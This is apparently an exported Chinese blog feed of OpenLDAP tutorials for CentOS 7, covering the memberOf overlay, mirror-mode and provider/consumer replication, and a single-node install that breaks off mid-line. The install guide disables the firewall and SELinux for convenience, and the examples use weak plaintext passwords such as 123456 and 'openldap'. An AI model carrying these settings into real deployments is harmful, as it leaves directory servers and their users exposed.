    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>默认情况下OpenLDAP的用户组属性是Posixgroup，Posixgroup用户组和用户没有实际的对应关系。如果需要把Posixgroup和user关联起来则需要将用户添加到对应的组中。 通过如上配置可以满足大部分业务场景，但是如果需要通过用户组来查找用户的话，Posixgroup用户组属性，是无法满足要求的。此时需要使用OpenLDAP的groupOfUniqueNames用户组属性。本篇文章Fayson主要介绍如何为OpenLDAP启用MemberOf。</p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>OpenLDAP版本为2.4.44</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="先查看openldap的数据库信息"><a href="#先查看openldap的数据库信息" class="headerlink" title="先查看openldap的数据库信息"></a>先查看openldap的数据库信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /etc/openldap/slapd.d/cn=config/</span><br><span class="line">或者</span><br><span class="line">ldapsearch -Q -LLL -Y EXTERNAL -H ldapi:/// -b cn=config dn</span><br></pre></td></tr></table></figure>

<p>得到的结果大概如下，不一样也不要害怕:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cn=module&#123;0&#125;.ldif cn=schema/ cn=schema.ldif olcDatabase=&#123;0&#125;config.ldif olcDatabase=&#123;-1&#125;frontend.ldif olcDatabase=&#123;1&#125;monitor.ldif olcDatabase=&#123;2&#125;bdb/ olcDatabase=&#123;2&#125;bdb.ldif</span><br></pre></td></tr></table></figure>

<p>其中有一个带什么<code>db.ldif</code>的就是你最终需要修改的数据库文件，我这里是<code>bdb.ldif</code>，你的可能是<code>mdb.ldif</code>，还有人是<code>hdb.ldif</code>，不管什么<code>db</code>，总之你要改的是一个叫<code>db</code>的文件就对了，你可以<code>cat</code>打开看一看，但是不要用<code>vi</code>去修改它。</p>
<h4 id="准备memberof-conf-ldif文件"><a href="#准备memberof-conf-ldif文件" class="headerlink" title="准备memberof_conf.ldif文件"></a>准备memberof_conf.ldif文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim memberof_conf.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启memberof支持</span></span><br><span class="line">dn: cn=module&#123;0&#125;,cn=config</span><br><span class="line">cn: modulle&#123;0&#125;</span><br><span class="line">objectClass: olcModuleList</span><br><span class="line">objectclass: top</span><br><span class="line">olcModuleload: memberof.la</span><br><span class="line">olcModulePath: /usr/lib64/openldap</span><br><span class="line"></span><br><span class="line"><span class="comment">#新增用户支持memberof配置</span></span><br><span class="line">dn: olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcConfig</span><br><span class="line">objectClass: olcMemberOf</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: top</span><br><span class="line">olcOverlay: memberof</span><br><span class="line">olcMemberOfDangling: ignore</span><br><span class="line">olcMemberOfRefInt: TRUE</span><br><span class="line">olcMemberOfGroupOC: groupOfUniqueNames</span><br><span class="line">olcMemberOfMemberAD: uniqueMember</span><br><span class="line">olcMemberOfMemberOfAD: memberOf</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/1.jpeg" alt></p>
<h4 id="编辑refint1-ldif文件"><a href="#编辑refint1-ldif文件" class="headerlink" title="编辑refint1.ldif文件"></a>编辑refint1.ldif文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim refint1.ldif </span><br><span class="line"></span><br><span class="line">dn: cn=module&#123;0&#125;,cn=config</span><br><span class="line">add: olcmoduleload</span><br><span class="line">olcmoduleload: refint</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/2.png" alt></p>
<h4 id="编辑refint2-ldif文件"><a href="#编辑refint2-ldif文件" class="headerlink" title="编辑refint2.ldif文件"></a>编辑refint2.ldif文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> vim refint2.ldif </span><br><span class="line"> </span><br><span class="line">dn: olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcConfig</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcRefintConfig</span><br><span class="line">objectClass: top</span><br><span class="line">olcOverlay: refint</span><br><span class="line">olcRefintAttribute: memberof member manager owner</span><br><span class="line"><span class="comment">#olcRefintAttribute: memberof uniqueMember  manager owner</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/3.jpeg" alt></p>
<h4 id="导入配置"><a href="#导入配置" class="headerlink" title="导入配置"></a>导入配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注意：导入时文件路径跟绝对路径</span></span><br><span class="line">ldapadd -Q -Y EXTERNAL -H ldapi:/// -f  /data/disk1/openladp/memberof_conf.ldif </span><br><span class="line">ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f  /data/disk1/openladp/refint1.ldif </span><br><span class="line">ldapadd -Q -Y EXTERNAL -H ldapi:/// -f /data/disk1/openladp/refint2.ldif</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/4.jpeg" alt></p>
<p>以上步骤就完成了OpenLDAP的MemberOf模块启用。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>验证一下配置，这个命令可以列出所有配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slapcat -b cn=config</span><br></pre></td></tr></table></figure>

<p><strong>创建用户测试</strong></p>
<p>1, 创建一个测试用户cdsw_a,ldif文件内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim cdsw_user.ldif</span><br><span class="line"></span><br><span class="line">dn: uid=cdsw_a,ou=People,dc=fayson,dc=com</span><br><span class="line">uid: cdsw_a</span><br><span class="line">cn: cdsw_a</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">userPassword: 123456</span><br><span class="line">shadowLastChange: 17694</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uidNumber: 10001</span><br><span class="line">gidNumber: 10001</span><br><span class="line">homeDirectory: /home/cdsw_a</span><br></pre></td></tr></table></figure>

<p>2, 执行如下命令将cdsw_a用户导入到OpenLDAP中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapadd -D &quot;cn=Manager,dc=fayson,dc=com&quot; -W -x -f cdsw_user.ldif</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/5.png" alt></p>
<p>3, 创建一个新的groupOfUniqueNames用户组，并把cdsw_a用户添加到该组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim cdsw_group.ldif </span><br><span class="line"></span><br><span class="line">dn: cn=cdsw_admin,ou=Group,dc=fayson,dc=com</span><br><span class="line">objectClass: groupOfUniqueNames</span><br><span class="line">cn: cdsw_admin</span><br><span class="line">uniqueMember: uid=cdsw_a,ou=People,dc=fayson,dc=com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/6.png" alt></p>
<ol start="4">
<li>将cdsw_admin组添加到OpenLDAP中</li>
</ol>
<p><img src="/articles/53f92c3c/7.png" alt></p>
<ol start="5">
<li>通过命令查看用户所属组，命令如下</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -LL -Y EXTERNAL -H ldapi:/// <span class="string">"(uid=cdsw_a)"</span> -b dc=fayson,dc=com memberOf</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/10.jpeg" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>在OpenLDAP中配置启用MemberOf时需要注意配置文件的通配符{0}/{2},这个数字不是随意指定的而是根据当前的/etc/openldap/slapd.d/cn=config/生成的内容得出</p>
<p><img src="/articles/53f92c3c/8.jpeg" alt></p>
<p>搜索例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># docker openldap</span><br><span class="line">docker exec xxxx ldapsearch -x -D &quot;cn=admin,dc=xxxx,dc=com&quot; -w &quot;xxxx&quot; -b &quot;dc=xxxx,dc=com&quot; &quot;cn=*&quot;</span><br><span class="line"></span><br><span class="line">#现在默认用docker安装openldap是开启了memberof，所以直接添加用户，添加用户组后，直接用下面命令验证</span><br><span class="line">ldapsearch -LL  -H ldapi:/// -D &quot;cn=admin,dc=xxx,dc=net&quot; -W &quot;(uid=sunxu)&quot; -b dc=xxx,dc=net memberOf</span><br></pre></td></tr></table></figure>

<p><img src="/articles/53f92c3c/8.png" alt></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7上配置最新版openldap服务多主模式(镜像模式)</title>
    <url>/articles/3337f7d4.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在实际产线运维环境下，使用最多的就是镜像模式，当然多IDC机房的情况下也会结合使用其他模式，例如主从模式。</p>
<p>镜像模式只允许2个主节点，如果超过2个节点其他节点只会同步获取前面2个节点的配置（这个是博客文档里面看到的，没有验证）</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table>
<thead>
<tr>
<th align="center">主机名称</th>
<th align="center">地址</th>
<th align="center">版本</th>
<th align="center">角色</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">sysldap-shylf-1</td>
<td align="center">10.116.72.11</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap, httpd, phpldapadmin</td>
<td align="center">主节点</td>
</tr>
<tr>
<td align="center">sysldap-shylf-2</td>
<td align="center">10.116.72.12</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap, httpd, phpldapadmin</td>
<td align="center">主节点</td>
</tr>
<tr>
<td align="center">systerm-shylf-1</td>
<td align="center">10.116.72.15</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap client</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>前提条件，为了方便配置防火墙以及禁用selinux<br>配置示例:dc=example,dc=com</p>
<a id="more"></a>

<h2 id="OpenLDAP服务基础配置"><a href="#OpenLDAP服务基础配置" class="headerlink" title="OpenLDAP服务基础配置"></a>OpenLDAP服务基础配置</h2><p>本文档假设2个节点都已经设置好了<a href="https://wandouduoduo.github.io/articles/be8d00d3.html#more" target="_blank" rel="noopener">OpenLDAP服务基础配置</a></p>
<h2 id="配置OpenLDAP-双主结构（mirrormode）"><a href="#配置OpenLDAP-双主结构（mirrormode）" class="headerlink" title="配置OpenLDAP 双主结构（mirrormode）"></a>配置OpenLDAP 双主结构（mirrormode）</h2><h3 id="OpenLDAP的2个主节点都需要添加模块syncprov"><a href="#OpenLDAP的2个主节点都需要添加模块syncprov" class="headerlink" title="OpenLDAP的2个主节点都需要添加模块syncprov"></a>OpenLDAP的2个主节点都需要添加模块syncprov</h3><p><strong><code>2个主节点都需要执行</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim mod_syncprov.ldif</span><br><span class="line"></span><br><span class="line">dn: cn=module,cn=config</span><br><span class="line">objectClass: olcModuleList</span><br><span class="line">cn: module</span><br><span class="line">olcModulePath: /usr/lib64/openldap</span><br><span class="line">olcModuleLoad: syncprov.la</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f mod_syncprov.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">vim syncprov.ldif</span><br><span class="line">dn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcSyncProvConfig</span><br><span class="line">olcOverlay: syncprov</span><br><span class="line">olcSpSessionLog: 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f syncprov.ldif</span><br></pre></td></tr></table></figure>

<h3 id="主节点1配置-10-116-72-11-同步"><a href="#主节点1配置-10-116-72-11-同步" class="headerlink" title="主节点1配置(10.116.72.11)同步"></a>主节点1配置(10.116.72.11)同步</h3><p>需要根据实际情况修改的参数：<br>provider 同步来源，也就是主节点，可以包含多个主节点<br>binddn 主节点管理账户<br>credentials 主节点管理账户密码<br>searchbase 根目录<br><strong><code>特别主机：2个主节点属性 olcServerID的值不能相同，provider指向对方</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim master_node_1.ldif</span><br><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcServerID</span><br><span class="line">olcServerID: 0</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcSyncRepl</span><br><span class="line">olcSyncRepl: rid=001</span><br><span class="line">  provider=ldap://10.116.72.12:389/</span><br><span class="line">  bindmethod=simple</span><br><span class="line">  binddn=<span class="string">"cn=Manager,dc=example,dc=com"</span></span><br><span class="line">  credentials=openldap</span><br><span class="line">  searchbase=<span class="string">"dc=example,dc=com"</span></span><br><span class="line">  scope=sub</span><br><span class="line">  schemachecking=on</span><br><span class="line">  <span class="built_in">type</span>=refreshAndPersist</span><br><span class="line">  retry=<span class="string">"30 5 300 3"</span></span><br><span class="line">  interval=00:00:05:00</span><br><span class="line">-</span><br><span class="line">add: olcMirrorMode</span><br><span class="line">olcMirrorMode: TRUE</span><br><span class="line"></span><br><span class="line">dn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: add</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcSyncProvConfig</span><br><span class="line">olcOverlay: syncprov</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f master_node_1.ldif</span><br></pre></td></tr></table></figure>

<h3 id="主节点2配置-10-116-72-12-同步"><a href="#主节点2配置-10-116-72-12-同步" class="headerlink" title="主节点2配置(10.116.72.12)同步"></a>主节点2配置(10.116.72.12)同步</h3><p><strong>特别主机：2个主节点属性 olcServerID的值不能相同，provider指向对方</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim master_node_2.ldif</span><br><span class="line"></span><br><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcServerID</span><br><span class="line">olcServerID: 1</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcSyncRepl</span><br><span class="line">olcSyncRepl: rid=001</span><br><span class="line">  provider=ldap://10.116.72.11:389/</span><br><span class="line">  bindmethod=simple</span><br><span class="line">  binddn=<span class="string">"cn=Manager,dc=example,dc=com"</span></span><br><span class="line">  credentials=openldap</span><br><span class="line">  searchbase=<span class="string">"dc=example,dc=com"</span></span><br><span class="line">  scope=sub</span><br><span class="line">  schemachecking=on</span><br><span class="line">  <span class="built_in">type</span>=refreshAndPersist</span><br><span class="line">  retry=<span class="string">"30 5 300 3"</span></span><br><span class="line">  interval=00:00:05:00</span><br><span class="line">-</span><br><span class="line">add: olcMirrorMode</span><br><span class="line">olcMirrorMode: TRUE</span><br><span class="line"></span><br><span class="line">dn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: add</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcSyncProvConfig</span><br><span class="line">olcOverlay: syncprov</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f master_node_2.ldif</span><br></pre></td></tr></table></figure>

<ul>
<li>验证</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">从服务节点验证数据是否同步正常</span><br><span class="line">ldapsearch -x -b <span class="string">'ou=People,dc=example,dc=com'</span></span><br><span class="line">[输出内容省略]</span><br><span class="line"></span><br><span class="line">验证是OK的。</span><br></pre></td></tr></table></figure>

<h3 id="远程主机配置（客户端-10-116-72-15）"><a href="#远程主机配置（客户端-10-116-72-15）" class="headerlink" title="远程主机配置（客户端 10.116.72.15）"></a>远程主机配置（客户端 10.116.72.15）</h3><p>客户端 可以指定多个openldap uri 修改配置如下（当然也可以只配置其中1个）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">authconfig --enableldap --enableldapauth --ldapserver=<span class="string">"10.116.72.11,10.116.72.12"</span> --ldapbasedn=<span class="string">"dc=example,dc=com"</span> --update</span><br></pre></td></tr></table></figure>

<ul>
<li>验证</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh  800001@10.116.72.15</span><br><span class="line">Warning: Permanently added <span class="string">'10.116.72.15'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">800001@10.116.72.15<span class="string">'s password: </span></span><br><span class="line"><span class="string">Last login: Thu Jul  4 17:59:32 2019 from 10.116.71.200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[800001@systerm-shylf-1 ~]$</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7上配置最新版openldap服务主从架构</title>
    <url>/articles/760f3c02.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在实际产线运维环境下，可能包含多个IDC机房，每个机房的主机都需要通过OpenLDAP体系管理运维账户登录。这种情况下可以配置OpenLDAP的主从架构实现(当然同一个机房也可以配置主从架构，客户端配置ldap uri指定多个地址)。主openldap节点称为“provider”可读可写，从openldap节点称为“consumer”只读。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table>
<thead>
<tr>
<th align="center">主机名称</th>
<th align="center">地址</th>
<th align="center">版本</th>
<th align="center">角色</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">sysldap-shylf-1</td>
<td align="center">10.116.72.11</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap, httpd, phpldapadmin</td>
<td align="center">主节点</td>
</tr>
<tr>
<td align="center">sysldap-shylf-2</td>
<td align="center">10.116.72.12</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap</td>
<td align="center">从节点，可以配置多从的</td>
</tr>
<tr>
<td align="center">systerm-shylf-1</td>
<td align="center">10.116.72.15</td>
<td align="center">CentOS7.6 min</td>
<td align="center">openLdap client</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>前提条件，为了方便配置防火墙以及禁用selinux<br>配置示例:dc=example,dc=com</p>
<a id="more"></a>

<h2 id="OpenLDAP服务基础配置"><a href="#OpenLDAP服务基础配置" class="headerlink" title="OpenLDAP服务基础配置"></a>OpenLDAP服务基础配置</h2><p>本文档假设2个节点都已经设置好了<a href="https://wandouduoduo.github.io/articles/be8d00d3.html#more" target="_blank" rel="noopener">OpenLDAP服务基础配置</a></p>
<h2 id="配置OpenLDAP主从结构"><a href="#配置OpenLDAP主从结构" class="headerlink" title="配置OpenLDAP主从结构"></a>配置OpenLDAP主从结构</h2><h3 id="主节点配置-10-116-72-11-，添加模块syncprov"><a href="#主节点配置-10-116-72-11-，添加模块syncprov" class="headerlink" title="主节点配置(10.116.72.11)，添加模块syncprov"></a>主节点配置(10.116.72.11)，添加模块syncprov</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim mod_syncprov.ldif</span><br><span class="line"></span><br><span class="line">dn: cn=module,cn=config</span><br><span class="line">objectClass: olcModuleList</span><br><span class="line">cn: module</span><br><span class="line">olcModulePath: /usr/lib64/openldap</span><br><span class="line">olcModuleLoad: syncprov.la</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f mod_syncprov.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">vim syncprov.ldif</span><br><span class="line">dn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcSyncProvConfig</span><br><span class="line">olcOverlay: syncprov</span><br><span class="line">olcSpSessionLog: 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f syncprov.ldif</span><br></pre></td></tr></table></figure>

<h3 id="从节点配置-10-116-72-12-同步"><a href="#从节点配置-10-116-72-12-同步" class="headerlink" title="从节点配置(10.116.72.12)同步"></a>从节点配置(10.116.72.12)同步</h3><p>需要根据实际情况修改的参数：<br>provider 同步来源，也就是主节点，可以包含多个主节点<br>binddn 主节点管理账户<br>credentials 主节点管理账户密码<br>searchbase 根目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim syncrepl.ldif</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcSyncRepl</span><br><span class="line">olcSyncRepl: rid=001</span><br><span class="line">  provider=ldap://10.116.72.11:389/</span><br><span class="line">  bindmethod=simple</span><br><span class="line">  binddn=<span class="string">"cn=Manager,dc=example,dc=com"</span></span><br><span class="line">  credentials=openldap</span><br><span class="line">  searchbase=<span class="string">"dc=example,dc=com"</span></span><br><span class="line">  scope=sub</span><br><span class="line">  schemachecking=on</span><br><span class="line">  <span class="built_in">type</span>=refreshAndPersist</span><br><span class="line">  retry=<span class="string">"30 5 300 3"</span></span><br><span class="line">  interval=00:00:05:00</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置使之生效</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f syncrepl.ldif</span><br></pre></td></tr></table></figure>

<ul>
<li>验证</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从服务节点验证数据是否同步正常</span><br><span class="line">ldapsearch -x -b &apos;ou=People,dc=example,dc=com&apos;</span><br><span class="line">[输出内容省略]</span><br><span class="line"></span><br><span class="line">验证是OK的。</span><br></pre></td></tr></table></figure>

<h3 id="远程主机配置（客户端-10-116-72-15）"><a href="#远程主机配置（客户端-10-116-72-15）" class="headerlink" title="远程主机配置（客户端 10.116.72.15）"></a>远程主机配置（客户端 10.116.72.15）</h3><p>客户端 可以指定多个openldap uri 修改配置如下（当然也可以只配置其中1个）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">authconfig --enableldap --enableldapauth --ldapserver=<span class="string">"10.116.72.11,10.116.72.12"</span> --ldapbasedn=<span class="string">"dc=example,dc=com"</span> --update</span><br></pre></td></tr></table></figure>

<ul>
<li>验证</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh  800001@10.116.72.15</span><br><span class="line">Warning: Permanently added <span class="string">'10.116.72.15'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">800001@10.116.72.15<span class="string">'s password: </span></span><br><span class="line"><span class="string">Last login: Thu Jul  4 17:59:32 2019 from 10.116.71.200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[800001@systerm-shylf-1 ~]$</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7上单节点安装配置最新版openldap服务</title>
    <url>/articles/be8d00d3.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了在centos7上安装最新版openldap的过程和常见场景。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>操作系统：centos7.6</p>
<p>软件版本：openldap-2.4.44</p>
<p>配置示例:   dc=example,dc=com</p>
<a id="more"></a>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>为了方便配置防火墙以及禁用selinux，或者关闭防火墙。</p>
<p>查看防火墙状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure>

<p>停止firewall</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>

<p>禁止firewall开机启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>

<p>关闭selinux </p>
<p>进入到/etc/selinux/config文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/selinux/config</span><br><span class="line">将SELINUX=enforcing改为SELINUX=disabled</span><br></pre></td></tr></table></figure>

<h2 id="OpenLDAP服务端配置"><a href="#OpenLDAP服务端配置" class="headerlink" title="OpenLDAP服务端配置"></a>OpenLDAP服务端配置</h2><p>创建一个配置目录，将相关配置文件放在这个目录下面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openldap</span><br><span class="line">├── base.ldif</span><br><span class="line">├── config.ldif</span><br><span class="line">├── demo.ldif</span><br><span class="line">├── loglevel.ldif</span><br><span class="line">├── schema</span><br><span class="line">│   ├── sudo.ldif</span><br><span class="line">│   └── sudo.schema</span><br><span class="line">├── sudo_ops_role.ldif</span><br><span class="line">└── SUODers.ldif</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> openldap</span><br></pre></td></tr></table></figure>

<h2 id="安装LDAP组件并启动服务"><a href="#安装LDAP组件并启动服务" class="headerlink" title="安装LDAP组件并启动服务"></a>安装LDAP组件并启动服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum安装</span></span><br><span class="line">yum -y install openldap  openldap-clients openldap-servers </span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立Ldap数据库</span></span><br><span class="line">cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</span><br><span class="line">chown ldap:ldap /var/lib/ldap/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动和开机自启</span></span><br><span class="line">systemctl start slapd.service</span><br><span class="line">systemctl <span class="built_in">enable</span> slapd.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">netstat -antup | grep -i 389</span><br><span class="line">tcp     0    0 0.0.0.0:389      0.0.0.0:*   LISTEN      16349/slapd     </span><br><span class="line">tcp6    0    0 :::389           :::*        LISTEN      16349/slapd</span><br></pre></td></tr></table></figure>

<h2 id="配置OpenLDAP服务"><a href="#配置OpenLDAP服务" class="headerlink" title="配置OpenLDAP服务"></a>配置OpenLDAP服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成Ldap root密码</span></span><br><span class="line">~]<span class="comment"># slappasswd</span></span><br><span class="line">New password: openldap</span><br><span class="line">Re-enter new password: openldap </span><br><span class="line">&#123;SSHA&#125;npo7WhvpY+s4+p584zAnoduStQzeTxHE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加需要的schemas [可以根据需要添加更多]</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif</span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif </span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置openLDAP服务</span></span><br><span class="line">vim config.ldif</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;1&#125;monitor,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcAccess</span><br><span class="line">olcAccess: &#123;0&#125;to * by dn.base=<span class="string">"gidNumber=0+uidNumber=0,cn=peercred,cn=external, cn=auth"</span> <span class="built_in">read</span> by dn.base=<span class="string">"cn=Manager,dc=example,dc=com"</span> <span class="built_in">read</span> by * none</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcSuffix</span><br><span class="line">olcSuffix: dc=example,dc=com</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcRootDN</span><br><span class="line">olcRootDN: cn=Manager,dc=example,dc=com</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcRootPW</span><br><span class="line">olcRootPW: &#123;SSHA&#125;npo7WhvpY+s4+p584zAnoduStQzeTxHE</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcAccess</span><br><span class="line">olcAccess: &#123;0&#125;to attrs=userPassword,shadowLastChange by dn=<span class="string">"cn=Manager,dc=example,dc=com"</span> write by anonymous auth by self write by * none</span><br><span class="line">olcAccess: &#123;1&#125;to dn.base=<span class="string">""</span> by * <span 